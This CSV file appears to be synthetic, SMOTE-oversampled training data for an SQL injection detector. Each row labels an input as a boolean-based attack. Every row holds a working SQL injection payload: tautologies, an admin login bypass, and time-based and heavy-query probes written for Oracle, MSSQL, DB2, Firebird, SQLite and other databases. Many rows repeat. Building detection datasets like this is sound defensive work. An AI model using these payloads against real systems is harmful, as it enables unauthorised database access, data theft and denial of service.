SMOTE_000121,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000003,4.548562681207139
SMOTE_000122,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000036,0.045102020559805854
SMOTE_000123,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.9798725688110108
SMOTE_000124,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.1117186887543473
SMOTE_000125,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,0.050735225401862726
SMOTE_000126,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,1.1107143005700137
SMOTE_000127,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,1.5632781941177345
SMOTE_000128,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,0.09904753335855776
SMOTE_000129,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,1.8391990025411296
SMOTE_000130,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,1.5569068686733978
SMOTE_000131,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,1.1678219950723012
SMOTE_000132,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,1.0836228171918174
SMOTE_000133,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.32425164060865985
SMOTE_000134,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.3230218886205651
SMOTE_000135,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.15957060749035568
SMOTE_000136,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.5802297682662171
SMOTE_000137,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.301606240688364
SMOTE_000138,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.5137625718979147
SMOTE_000139,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,0.39963210330599425
SMOTE_000140,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.24359021699454045
SMOTE_000141,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.875937897787818
SMOTE_000142,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.1584078034415621
SMOTE_000143,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.8100045255479843
SMOTE_000144,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.0003274560656015072
SMOTE_000145,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,0.29355236543917274
SMOTE_000146,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.2557385016093027
SMOTE_000147,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.5679823290287536
SMOTE_000148,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.3625525280127322
SMOTE_000149,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,2.2402748659978102
SMOTE_000150,attack,boolean,"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",nearest_attack_euclidean,R000075,0.27299899805747396
SMOTE_000151,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.12582551863461144
SMOTE_000152,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.14351952319670963
SMOTE_000153,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.9895334483400696
SMOTE_000154,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,2.2708173687547406
SMOTE_000155,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,1.2436238341298467
SMOTE_000156,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.7615984195302541
SMOTE_000157,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,1.3596110109580075
SMOTE_000158,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.5896775183371996
SMOTE_000159,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.1769091929023408
SMOTE_000160,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,0.39052254655139695
SMOTE_000161,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.280631721582726
SMOTE_000162,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.7134013718379932
SMOTE_000163,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.19842404435092645
SMOTE_000164,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.6945383474144305
SMOTE_000165,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.152741788141814
SMOTE_000166,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,1.3484072522901724
SMOTE_000167,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.46044351229333125
SMOTE_000168,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,0.3025457542733633
SMOTE_000169,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,0.1739586225542119
SMOTE_000170,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.087639081008684
SMOTE_000171,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,0.6951202442102928
SMOTE_000172,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.7376301668743097
SMOTE_000173,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,0.7727454218438984
SMOTE_000174,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.010317421637177544
SMOTE_000175,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,1.6630491864839492
SMOTE_000176,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,1.7072003264656426
SMOTE_000177,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,0.3447272109977422
SMOTE_000178,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,0.46651447968301907
SMOTE_000179,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.0152982384910654
SMOTE_000180,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.06487337373429497
SMOTE_000181,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.11693418826374924
SMOTE_000182,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,1.5228792165008824
SMOTE_000183,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.06341548037726515
SMOTE_000184,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.5688834397481218
SMOTE_000185,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,2.7920510642344882
SMOTE_000186,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,1.9616114176173507
SMOTE_000187,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000012,1.749700409923551
SMOTE_000188,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.11006543136034898
SMOTE_000189,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,1.884946999642284
SMOTE_000190,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,0.44568861995677256
SMOTE_000191,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,0.9684605473482765
SMOTE_000192,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,0.07962601342003782
SMOTE_000193,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.9126376096700535
SMOTE_000194,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.4302755854206486
SMOTE_000195,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,2.4748367907477844
SMOTE_000196,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.5184482835833418
SMOTE_000197,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,0.16973670327610338
SMOTE_000198,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,1.2182291817180286
SMOTE_000199,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.2710775479871699
SMOTE_000200,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.8619022750704144
SMOTE_000201,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,0.27540257825741354
SMOTE_000202,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.45852018797374405
SMOTE_000203,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,0.13465881762197685
SMOTE_000204,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.36667612165746394
SMOTE_000205,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,0.6281180385978308
SMOTE_000206,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,0.785175996494892
SMOTE_000207,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.4087660956898842
SMOTE_000208,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,0.8006025590296364
SMOTE_000209,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R000078,2.2918351730004143
SMOTE_000210,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.3579671065163048
SMOTE_000211,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,1.8050371620253438
SMOTE_000212,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.7808215953485388
SMOTE_000213,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,2.102515843785826
SMOTE_000214,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,0.32763154446834647
SMOTE_000215,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,1.542825022278116
SMOTE_000216,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,0.25799647515286195
SMOTE_000217,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,2.459876171655836
SMOTE_000218,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.4642460939118986
SMOTE_000219,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.1477970791296055
SMOTE_000220,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.630417714103876
SMOTE_000221,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,1.249582699125338
SMOTE_000222,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.2236474789973028
SMOTE_000223,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,1.4858495062520067
SMOTE_000224,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,0.0958343078168568
SMOTE_000225,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,2.663365695363312
SMOTE_000226,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.4840640921911655
SMOTE_000227,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,0.4839466469564218
SMOTE_000228,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.4703835537059987
SMOTE_000229,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,2.14702814817461
SMOTE_000230,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.2926041283460123
SMOTE_000231,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,0.49106432603204253
SMOTE_000232,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.8808379150893361
SMOTE_000233,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.8477452401778037
SMOTE_000234,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.0085993885095403
SMOTE_000235,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.8758819754721219
SMOTE_000236,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.145073124005741
SMOTE_000237,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.675568216880435
SMOTE_000238,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.9248792163556234
SMOTE_000239,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.1857042743770598
